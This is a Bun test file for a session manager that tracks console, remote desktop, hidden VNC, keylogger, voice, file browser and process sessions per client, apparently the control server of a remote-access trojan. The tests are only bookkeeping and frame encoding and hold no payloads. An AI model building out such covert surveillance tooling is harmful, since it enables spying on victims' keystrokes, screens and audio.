import { describe, expect, test, beforeEach } from "bun:test";
import {
  addConsoleSession,
  getConsoleSession,
  deleteConsoleSession,
  getConsoleSessionsByClient,
  getConsoleSessionCount,
  addRdSession,
  getRdSession,
  deleteRdSession,
  getRdSessionsByClient,
  getRdSessionCount,
  hasRdSessionsForClient,
  addHvncSession,
  getHvncSession,
  deleteHvncSession,
  getHvncSessionsByClient,
  hasHvncSessionsForClient,
  getHvncSessionCount,
  addFileBrowserSession,
  getFileBrowserSession,
  deleteFileBrowserSession,
  getFileBrowserSessionsByClient,
  getFileBrowserSessionCount,
  addProcessSession,
  getProcessSession,
  deleteProcessSession,
  getProcessSessionsByClient,
  getProcessSessionCount,
  addKeyloggerSession,
  getKeyloggerSession,
  deleteKeyloggerSession,
  getKeyloggerSessionsByClient,
  addVoiceSession,
  getVoiceSession,
  deleteVoiceSession,
  getVoiceSessionsByClient,
  addNotificationSession,
  deleteNotificationSession,
  getNotificationSessionCount,
  addDashboardSession,
  deleteDashboardSession,
  getDashboardSessionCount,
  safeSendViewerFrame,
  getAllConsoleSessions,
  getAllRdSessions,
} from "./sessionManager";
import type { ServerWebSocket } from "bun";
import type { SocketData } from "./types";

// Minimal mock ws that records sends
function mockWs(): ServerWebSocket<SocketData> {
  const sent: any[] = [];
  return {
    send: (data: any) => { sent.push(data); return data.length || 0; },
    close: () => {},
    data: { role: "console_viewer" as any, clientId: "c1" },
    _sent: sent,
  } as any;
}

// We need to clear sessions between tests. The session manager uses module-level Maps,
// so we just delete sessions we create.
function cleanupConsoleSessions(ids: string[]) {
  for (const id of ids) deleteConsoleSession(id);
}

describe("sessionManager - console sessions", () => {
  const ids: string[] = [];

  test("add and get a console session", () => {
    const ws = mockWs();
    const session = { id: "cs-1", clientId: "client-a", viewer: ws, createdAt: Date.now() };
    ids.push("cs-1");
    addConsoleSession(session);

    const retrieved = getConsoleSession("cs-1");
    expect(retrieved).toBeDefined();
    expect(retrieved!.clientId).toBe("client-a");
  });

  test("get nonexistent session returns undefined", () => {
    expect(getConsoleSession("nonexistent")).toBeUndefined();
  });

  test("delete returns true for existing session", () => {
    const ws = mockWs();
    addConsoleSession({ id: "cs-del", clientId: "client-b", viewer: ws, createdAt: Date.now() });
    expect(deleteConsoleSession("cs-del")).toBe(true);
  });

  test("delete returns false for nonexistent session", () => {
    expect(deleteConsoleSession("no-such-id")).toBe(false);
  });

  test("getConsoleSessionsByClient returns sessions for that client", () => {
    const ws = mockWs();
    addConsoleSession({ id: "cs-c1", clientId: "multi-client", viewer: ws, createdAt: Date.now() });
    addConsoleSession({ id: "cs-c2", clientId: "multi-client", viewer: ws, createdAt: Date.now() });
    addConsoleSession({ id: "cs-c3", clientId: "other-client", viewer: ws, createdAt: Date.now() });

    ids.push("cs-c1", "cs-c2", "cs-c3");

    const sessions = getConsoleSessionsByClient("multi-client");
    expect(sessions.length).toBe(2);
    expect(sessions.map(s => s.id).sort()).toEqual(["cs-c1", "cs-c2"]);
  });

  test("getConsoleSessionsByClient returns empty for unknown client", () => {
    expect(getConsoleSessionsByClient("unknown-client")).toEqual([]);
  });

  // Clean up all created sessions
  test("cleanup", () => {
    cleanupConsoleSessions(ids);
  });
});

describe("sessionManager - remote desktop sessions", () => {
  test("add, get, and delete RD session", () => {
    const ws = mockWs();
    addRdSession({ id: "rd-1", clientId: "c-rd", viewer: ws, createdAt: Date.now() });

    expect(getRdSession("rd-1")).toBeDefined();
    expect(hasRdSessionsForClient("c-rd")).toBe(true);
    expect(getRdSessionsByClient("c-rd").length).toBe(1);

    expect(deleteRdSession("rd-1")).toBe(true);
    expect(getRdSession("rd-1")).toBeUndefined();
    expect(hasRdSessionsForClient("c-rd")).toBe(false);
  });

  test("delete nonexistent RD session returns false", () => {
    expect(deleteRdSession("no-rd")).toBe(false);
  });
});

describe("sessionManager - HVNC sessions", () => {
  test("add, get, and delete HVNC session", () => {
    const ws = mockWs();
    addHvncSession({ id: "hvnc-1", clientId: "c-hvnc", viewer: ws, createdAt: Date.now() });

    expect(getHvncSession("hvnc-1")).toBeDefined();
    expect(hasHvncSessionsForClient("c-hvnc")).toBe(true);
    expect(getHvncSessionsByClient("c-hvnc").length).toBe(1);
    expect(getHvncSessionCount()).toBeGreaterThanOrEqual(1);

    expect(deleteHvncSession("hvnc-1")).toBe(true);
    expect(getHvncSession("hvnc-1")).toBeUndefined();
  });
});

describe("sessionManager - file browser sessions", () => {
  test("add, get, and delete file browser session", () => {
    const ws = mockWs();
    addFileBrowserSession({ id: "fb-1", clientId: "c-fb", viewer: ws, createdAt: Date.now() });

    expect(getFileBrowserSession("fb-1")).toBeDefined();
    expect(getFileBrowserSessionsByClient("c-fb").length).toBe(1);

    expect(deleteFileBrowserSession("fb-1")).toBe(true);
    expect(getFileBrowserSession("fb-1")).toBeUndefined();
  });
});

describe("sessionManager - process sessions", () => {
  test("add, get, and delete process session", () => {
    const ws = mockWs();
    addProcessSession({ id: "ps-1", clientId: "c-ps", viewer: ws, createdAt: Date.now() });

    expect(getProcessSession("ps-1")).toBeDefined();
    expect(getProcessSessionsByClient("c-ps").length).toBe(1);

    expect(deleteProcessSession("ps-1")).toBe(true);
    expect(getProcessSession("ps-1")).toBeUndefined();
  });
});

describe("sessionManager - keylogger sessions", () => {
  test("add, get, and delete keylogger session", () => {
    const ws = mockWs();
    addKeyloggerSession({ id: "kl-1", clientId: "c-kl", viewer: ws, createdAt: Date.now() });

    expect(getKeyloggerSession("kl-1")).toBeDefined();
    expect(getKeyloggerSessionsByClient("c-kl").length).toBe(1);

    expect(deleteKeyloggerSession("kl-1")).toBe(true);
    expect(getKeyloggerSession("kl-1")).toBeUndefined();
  });
});

describe("sessionManager - voice sessions", () => {
  test("add, get, and delete voice session", () => {
    const ws = mockWs();
    addVoiceSession({ id: "vc-1", clientId: "c-vc", viewer: ws, createdAt: Date.now() });

    expect(getVoiceSession("vc-1")).toBeDefined();
    expect(getVoiceSessionsByClient("c-vc").length).toBe(1);

    expect(deleteVoiceSession("vc-1")).toBe(true);
    expect(getVoiceSession("vc-1")).toBeUndefined();
  });
});

describe("sessionManager - notification sessions", () => {
  test("add and delete notification session", () => {
    const ws = mockWs();
    addNotificationSession({ id: "ns-1", viewer: ws, createdAt: Date.now() });

    expect(getNotificationSessionCount()).toBeGreaterThanOrEqual(1);
    expect(deleteNotificationSession("ns-1")).toBe(true);
  });
});

describe("sessionManager - dashboard sessions", () => {
  test("add and delete dashboard session", () => {
    const ws = mockWs();
    addDashboardSession({ id: "ds-1", viewer: ws, createdAt: Date.now() });

    expect(getDashboardSessionCount()).toBeGreaterThanOrEqual(1);
    expect(deleteDashboardSession("ds-1")).toBe(true);
  });
});

describe("safeSendViewerFrame", () => {
  test("constructs correct binary frame with header", () => {
    const sent: any[] = [];
    const ws = {
      send: (data: any) => { sent.push(data); },
    } as any;

    const payload = new Uint8Array([1, 2, 3, 4]);
    const header = { type: "frame", display: 0 };

    const bytesSent = safeSendViewerFrame(ws, payload, header);
    expect(bytesSent).toBeGreaterThan(0);
    expect(sent.length).toBe(1);

    // Verify the frame structure: 4-byte length + meta + payload
    const frame = sent[0] as Uint8Array;
    const metaLen = new DataView(frame.buffer, frame.byteOffset, 4).getUint32(0, false);
    expect(metaLen).toBeGreaterThan(0);

    const metaBytes = frame.slice(4, 4 + metaLen);
    const meta = JSON.parse(new TextDecoder().decode(metaBytes));
    expect(meta.type).toBe("frame");
    expect(meta.display).toBe(0);

    const payloadBytes = frame.slice(4 + metaLen);
    expect(payloadBytes).toEqual(payload);
  });

  test("returns 0 when send throws", () => {
    const ws = {
      send: () => { throw new Error("closed"); },
    } as any;

    const result = safeSendViewerFrame(ws, new Uint8Array([1]), {});
    expect(result).toBe(0);
  });

  test("handles empty payload", () => {
    const sent: any[] = [];
    const ws = {
      send: (data: any) => { sent.push(data); },
    } as any;

    const bytesSent = safeSendViewerFrame(ws, new Uint8Array(0), { type: "empty" });
    expect(bytesSent).toBeGreaterThan(0);
  });
});
